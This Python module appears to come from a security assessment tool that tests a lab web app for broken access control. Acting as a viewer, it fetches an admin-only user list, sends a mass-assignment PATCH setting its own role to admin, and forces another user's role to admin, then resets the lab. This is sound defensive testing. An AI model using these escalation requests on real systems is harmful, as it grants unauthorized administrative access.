"""Broken RBAC + privilege-escalation detector.

Proves function-level authorization failures: a low-privilege user reaching an
admin-only function, escalating its own role via mass assignment, or changing
another user's role. Mutating tests are bracketed by reset_lab().
"""
from app.config import LAB, AssessmentConfig
from app.engine import verification as V
from app.engine.authorization import run as run_authz
from app.engine.http_client import ScopedClient
from app.engine.verification import VerifiedFinding


def run_rbac(config: AssessmentConfig = LAB, shared=None):
    graph, principals, _ = shared or run_authz(config)
    by_role = {p.role: p for p in principals}
    findings: list[VerifiedFinding] = []

    with ScopedClient(config) as client:
        # 1. Broken function-level auth: non-admin reaches admin listing (non-destructive)
        attacker = by_role["viewer"]
        token = V.login(client, config, attacker.role)
        resp = client.get("/api/admin/users", headers=V.auth(token))
        body = resp.json() if resp.status_code == 200 else []
        ok = resp.status_code == 200 and isinstance(body, list) and len(body) > 1
        findings.append(VerifiedFinding(
            id="RBAC-ADMIN-LIST", category="BROKEN_RBAC",
            title="Non-admin reaches the admin-only user listing",
            actor_role=attacker.role, endpoint="GET /api/admin/users",
            status="verified" if ok else "not_reproduced",
            rationale=f"{attacker.username} ({attacker.role}) listed "
                      f"{len(body) if isinstance(body, list) else '?'} users via an admin route.",
            evidence=[{"step": "admin GET",
                       "request": {"as_role": attacker.role, "method": "GET",
                                   "path": "/api/admin/users"},
                       "response": {"status": resp.status_code,
                                    "count": len(body) if isinstance(body, list) else None,
                                    "sample": V.redact(body[0]) if body else None}}],
            retest={"name": "RBAC-ADMIN-LIST", "category": "BROKEN_RBAC",
                    "steps": [{"as_role": attacker.role, "method": "GET",
                               "path": "/api/admin/users", "expect_status": 200,
                               "expect": "list of all users"}]},
        ))

        # 2. Priv-esc via mass assignment (DESTRUCTIVE)
        attacker = by_role["viewer"]
        V.reset_lab(client)
        token = V.login(client, config, attacker.role)
        before = client.get("/api/users/me", headers=V.auth(token)).json().get("role")
        client.patch("/api/users/me", json={"role": "admin"}, headers=V.auth(token))
        after = client.get("/api/users/me", headers=V.auth(token)).json().get("role")
        ok = before != "admin" and after == "admin"
        findings.append(VerifiedFinding(
            id="PRIVESC-MASS-ASSIGNMENT", category="PRIV_ESC",
            title="Viewer escalates to admin via mass assignment on PATCH /api/users/me",
            actor_role=attacker.role, endpoint="PATCH /api/users/me", destructive=True,
            status="verified" if ok else "not_reproduced",
            rationale=f"role moved '{before}' -> '{after}' by submitting a 'role' field. "
                      f"Lab state restored.",
            evidence=[{"step": "patch self role",
                       "request": {"as_role": attacker.role, "method": "PATCH",
                                   "path": "/api/users/me", "body": {"role": "admin"}},
                       "response": {"role_before": before, "role_after": after}}],
            retest={"name": "PRIVESC-MASS-ASSIGNMENT", "category": "PRIV_ESC", "destructive": True,
                    "steps": [{"as_role": attacker.role, "method": "PATCH", "path": "/api/users/me",
                               "body": {"role": "admin"}, "expect": "role becomes admin"}],
                    "cleanup": [{"action": "reset_lab"}]},
        ))
        V.reset_lab(client)

        # 3. Forced role change on another user (DESTRUCTIVE)
        attacker, victim = by_role["viewer"], by_role["analyst"]
        V.reset_lab(client)
        token = V.login(client, config, attacker.role)
        client.post(f"/api/admin/users/{victim.uid}/role",
                    json={"role": "admin"}, headers=V.auth(token))
        check = client.get(f"/api/users/{victim.uid}", headers=V.auth(token)).json().get("role")
        ok = check == "admin"
        findings.append(VerifiedFinding(
            id="PRIVESC-ROLE-CHANGE", category="PRIV_ESC",
            title="Viewer changes another user's role via the admin endpoint",
            actor_role=attacker.role,
            endpoint="POST /api/admin/users/{user_id}/role", destructive=True,
            status="verified" if ok else "not_reproduced",
            rationale=f"{attacker.username} set {victim.username}'s role to '{check}'. "
                      f"Lab state restored.",
            evidence=[{"step": "force role change",
                       "request": {"as_role": attacker.role, "method": "POST",
                                   "path": f"/api/admin/users/{victim.uid}/role",
                                   "body": {"role": "admin"}},
                       "response": {"victim_role_after": check}}],
            retest={"name": "PRIVESC-ROLE-CHANGE", "category": "PRIV_ESC", "destructive": True,
                    "steps": [{"as_role": attacker.role, "method": "POST",
                               "path": f"/api/admin/users/{victim.uid}/role",
                               "body": {"role": "admin"}, "expect": "victim role becomes admin"}],
                    "cleanup": [{"action": "reset_lab"}]},
        ))
        V.reset_lab(client)

    return findings


if __name__ == "__main__":
    results = run_rbac()
    V.print_findings(results, "Broken RBAC / privilege-escalation detector")
    n = V.save_scenarios(results, "retest_scenarios_rbac.json")
    print(f"Saved {n} re-test scenario(s) -> retest_scenarios_rbac.json")
